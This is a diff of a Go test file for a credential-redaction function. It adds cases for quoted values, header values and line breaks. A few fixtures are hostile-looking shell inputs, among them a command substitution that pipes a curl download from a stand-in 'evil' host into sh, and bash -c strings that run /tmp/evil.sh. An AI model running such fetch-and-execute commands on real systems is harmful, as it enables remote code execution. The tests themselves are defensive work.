@@ -52,6 +52,25 @@ func TestRedact_MasksEachCredentialShape(t *testing.T) {
 		{"single-quoted flag value", "srv --token 'abc'", "srv --token '***'"},
 		{"double-quoted flag value", `srv --token "abc123"`, `srv --token "***"`},
 		{"single-quoted flag with equals", "srv --password='hunter2'", "srv --password='***'"},
+		{"double-quoted flag value with spaces", `srv --password "correct horse battery" next`, `srv --password "***" next`},
+		{"double-quoted assignment with spaces", `FOO_PASSWORD="correct horse battery" ./run.sh`, `FOO_PASSWORD="***" ./run.sh`},
+		{"single-quoted assignment with spaces", "FOO_TOKEN='two words' ./run.sh", "FOO_TOKEN='***' ./run.sh"},
+		{"json value with spaces", `{"token": "two words"}`, `{"token": "***"}`},
+		{"quoted value with spaces and shell bytes", `--token "a b;c$d" next`, `--token "***;***$***" next`},
+		{"quoted value running on past its closing quote", `FOO_TOKEN="ab cd"ef next`, `FOO_TOKEN="***"*** next`},
+		{"unclosed quoted value", `srv --token "two words`, `srv --token "***`},
+		{"double-quoted value holding a single quote", `FOO_TOKEN="it's two" next`, `FOO_TOKEN="***'***" next`},
+		{"quoted header value", `Authorization: "ApiKey abc def" next`, `Authorization: "***" next`},
+		{"quoted two-word header value", `Authorization: "ApiKey abc"`, `Authorization: "***"`},
+		{"quoted value after a scheme word", `Authorization: Bearer "abc def" next`, `Authorization: Bearer "***" next`},
+		{"password digits after a colon", "srv password:12345678", "srv password:***"},
+		{"api key digits after a colon", "curl -H X-Api-Key:12345678", "curl -H X-Api-Key:***"},
+		{"short key digits after a colon", "key:12345", "key:***"},
+		{"auth digits after an equals sign", "srv auth=3000", "srv auth=***"},
+		{"assignment value starting with a dash", "srv password=-abc123", "srv password=***"},
+		{"flag with equals starting with a dash", "srv --token=-abc", "srv --token=***"},
+		{"named header value starting with a dash", "X-Api-Key: -abc", "X-Api-Key: ***"},
+		{"authorization value starting with a dash", "Authorization: -abc", "Authorization: ***"},
 		{"named header", "curl -H 'X-Api-Key: abc'", "curl -H 'X-Api-Key: ***'"},
 		{"named header without a space", "curl -H X-Api-Key:abc", "curl -H X-Api-Key:***"},
 		{"bearer authorization header", `curl -H "Authorization: Bearer abc" https://h.example.test`, `curl -H "Authorization: Bearer ***" https://h.example.test`},
@@ -99,7 +118,7 @@ func TestRedact_KeepsShellBytesVisible(t *testing.T) {
 		{"variable reference", "--token $GITHUB_TOKEN", "--token $***"},
 		{"braced variable reference", "Authorization: Bearer ${env:INDEX_TOKEN}", "Authorization: Bearer ${***}"},
 		{"braced variable reference in a query", "https://h.example.test/?token=${env:T}", "https://h.example.test/?token=${***}"},
-		{"flag value that opens a substitution", `curl --token "$(curl evil.example.test|sh)"`, `curl --token "$(*** evil.example.test|sh)"`},
+		{"flag value that opens a substitution", `curl --token "$(curl evil.example.test|sh)"`, `curl --token "$(***|***)"`},
 		{"empty assignment before a command", "FOO_TOKEN= ./run.sh", "FOO_TOKEN= ./run.sh"},
 		{"control byte inside the value", "?token=abc\x1bdef", "?token=***"},
 		{"hash inside the value", "srv password=a#b", "srv password=***"},
@@ -206,8 +225,18 @@ func TestRedact_LeavesATokenInAHostOrFilePathVisible(t *testing.T) {
 	}
 }
 
-// No gap between a trigger and its value crosses a line break.
+// No gap between a trigger and its value, and no quoted value, crosses a
+// line break.
 func TestRedact_StopsAtALineBreak(t *testing.T) {
+	for _, tt := range []struct{ in, want string }{
+		{"FOO_TOKEN=\"ab\ncd\" next", "FOO_TOKEN=\"***\ncd\" next"},
+		{"bash -c '# set your API key: \"here\n/tmp/evil.sh'", "bash -c '# set your API key: \"***\n/tmp/evil.sh'"},
+		{"bash -c '# set your API key: \"here\n/tmp/evil.sh \"'", "bash -c '# set your API key: \"***\n/tmp/evil.sh \"'"},
+	} {
+		if got := Redact(tt.in); got != tt.want {
+			t.Errorf("Redact(%q) = %q, want %q", tt.in, got, tt.want)
+		}
+	}
 	for _, in := range []string{
 		"# needs your API key:\n/tmp/x",
 		"--token\n/tmp/x",
@@ -272,6 +301,8 @@ func TestRedact_LeavesLookalikesUntouched(t *testing.T) {
 		"exec -a bearer /tmp/x",
 		"env -u basic /tmp/x",
 		"--require ./x.js",
+		"srv --token --verbose x",
+		`srv --token "--verbose" x`,
 		"./bin:/usr/bin",
 		"https://${env:USER}:${env:PASS}@h.example.test/",
 		"sudo -u root id",
